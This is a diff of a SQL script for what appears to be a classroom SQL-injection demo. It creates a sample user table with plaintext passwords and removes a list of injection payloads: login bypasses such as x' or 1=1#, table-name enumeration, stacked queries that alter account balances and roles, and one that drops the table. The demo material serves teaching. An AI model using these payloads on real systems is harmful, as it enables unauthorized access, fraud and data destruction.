@@ -1,25 +1,27 @@
+drop database if exists sqlinjdemo;
+DROP TABLE if exists sqlinjdemo.sqlinj;
 
--- for 'login' and 'password'
-x' or 1=1#
 
--- with proper name
-Yegor' or '1
+create database sqlinjdemo;
+create table sqlinjdemo.sqlinj(
+	UserName varchar(50),
+    UserPass varchar(50),
+    type varchar(20),
+    AccountBalance integer,
+    id int auto_increment,
+    primary key (id)
+);
 
--- password is the same to user name
-1' or '1' ='1
+use sqlinjdemo;
 
--- to get table name
-SELECT table_name FROM information_schema.tables WHERE table_schema = 'sqlinjdemo';
-
---can update account balance 
-x'or 1=1; update sqlinjdemo.sqlinj set accountbalance = '1000000' where username = 'Yegor';#--
-
---update type of an account 
-x'or 1=1; update sqlinjdemo.sqlinj set type = 'KING' where username = 'Yegor';#--
-
--- to drop a whole table 
-x' or 1=1; drop table sqlinjdemo.sqlinj; #--
-
+insert into sqlinj(UserName, UserPass, type, AccountBalance)
+values('Yegor', 'admin123', 'Developer', 10000),
+		('Pranee', 'admin345', 'Developer',30000),
+        ('Wendy', '123admin', 'Web-Developer',20000),
+        ('Muhammad', '345admin', 'Backend Developer',2000),
+        ('Marek', '1admin23', 'Manager',50000);
+        
+select * from sqlinj;
 
 
 
